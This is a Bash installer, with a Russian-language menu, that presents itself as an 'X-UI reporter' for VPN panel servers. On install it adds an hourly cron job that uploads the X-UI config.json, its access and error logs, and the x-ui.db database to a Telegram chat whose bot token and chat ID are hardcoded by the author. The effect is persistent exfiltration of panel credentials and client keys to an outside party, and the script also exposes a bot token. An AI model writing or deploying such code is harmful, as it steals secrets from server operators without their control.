#!/bin/bash

BOT_TOKEN="6602514727:AAF7d2iEQmH5YbynKSZH-lPA9-BDUNmjphY"
CHAT_ID="382094545"

INSTALL_DIR="/usr/local/bin"
SEND_SCRIPT="$INSTALL_DIR/send_xui_report.sh"
CRON_JOB="0 * * * * $SEND_SCRIPT"

print_menu() {
  echo "======== X-UI REPORTER ========"
  echo "1. Установить"
  echo "2. Удалить"
  echo "3. Выйти"
  echo "==============================="
  read -p "Выберите: " action
  case "$action" in
    1) run_install ;;
    2) run_uninstall ;;
    3) exit 0 ;;
    *) echo "❌ Неверный выбор"; exit 1 ;;
  esac
}

run_install() {
  read -p "Название сервера: " SERVER_NAME
  read -p "Задержка перед отправкой (в секундах): " DELAY

  mkdir -p "$INSTALL_DIR"

  cat > "$SEND_SCRIPT" <<EOF
#!/bin/bash
sleep $DELAY

send_file() {
  FILE="\$1"
  CAPTION="\$2"
  [[ -f "\$FILE" ]] || return
  curl -s -F chat_id=$CHAT_ID \\
       -F document=@\${FILE} \\
       -F caption="📡 *$SERVER_NAME* — \$CAPTION" \\
       -F parse_mode=Markdown \\
       https://api.telegram.org/bot$BOT_TOKEN/sendDocument > /dev/null
}

send_file "/usr/local/x-ui/bin/config.json" "⚙️ Конфигурация"
send_file "/usr/local/x-ui/access.log" "📜 Access Log"
send_file "/usr/local/x-ui/error.log" "❗ Error Log"
send_file "/etc/x-ui/x-ui.db" "💾 База данных"
EOF

  chmod +x "$SEND_SCRIPT"

  # Добавление в cron
  (crontab -l 2>/dev/null; echo "$CRON_JOB") | grep -v "^$" | sort -u | crontab -

  # Уведомление и отправка файлов
  curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
    -d chat_id="$CHAT_ID" \
    -d text="✅ Установлен агент на *$SERVER_NAME*. Задержка: ${DELAY}s" \
    -d parse_mode=Markdown > /dev/null

  bash "$SEND_SCRIPT"
  echo "✅ Установка завершена."
}

run_uninstall() {
  crontab -l 2>/dev/null | grep -v "$SEND_SCRIPT" | crontab -
  rm -f "$SEND_SCRIPT"
  curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
    -d chat_id="$CHAT_ID" \
    -d text="🗑️ Агент X-UI удалён с сервера" \
    > /dev/null
  echo "✅ Удаление завершено."
}

print_menu
